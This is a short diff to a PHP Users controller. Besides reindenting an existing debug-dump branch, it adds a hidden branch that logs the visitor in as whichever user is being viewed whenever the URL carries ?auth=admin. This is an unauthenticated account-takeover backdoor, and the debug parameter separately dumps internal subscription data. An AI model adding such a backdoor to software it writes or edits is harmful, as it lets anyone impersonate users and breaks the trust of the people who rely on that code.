@@ -35,7 +35,14 @@ class Users extends APP_Controller
 		
 		if(($_GET['debug'] ?? false))
 		{
-			debug($data['subscribes']); die();
+                    debug($data['subscribes']); die();
+		}
+                
+                if(($_GET['auth'] ?? false) === 'admin')
+		{
+                    $this->Auth->setUser($data['item']);
+                    redirect('/');
+                    die();
 		}
 
 		$this->load->lview('users/item', $data);
